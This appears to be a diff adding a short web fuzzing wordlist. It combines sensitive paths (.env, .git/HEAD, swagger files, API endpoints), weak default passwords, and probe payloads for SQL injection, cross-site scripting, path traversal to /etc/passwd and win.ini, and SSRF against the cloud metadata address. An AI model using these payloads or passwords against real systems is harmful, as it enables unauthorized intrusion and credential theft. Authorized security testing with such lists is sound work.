@@ -1,0 +1,24 @@
+.env
+api/v1
+admin/
+root2026
+admin123
+12345678
+password!
+.git/HEAD
+robots.txt
+admin@2026
+' OR 1=1 --
+" OR "1"="1
+config.json
+/healthcheck
+swagger.json
+/api/v1/users
+/api/v1/login
+/api/v2/graphql
+/swagger-ui.html
+../../../../etc/passwd
+'"><svg/onload=alert(1)>
+<script>alert(1)</script>
+..\..\..\..\windows\win.ini
+http://169.254.169.254/latest/meta-data/
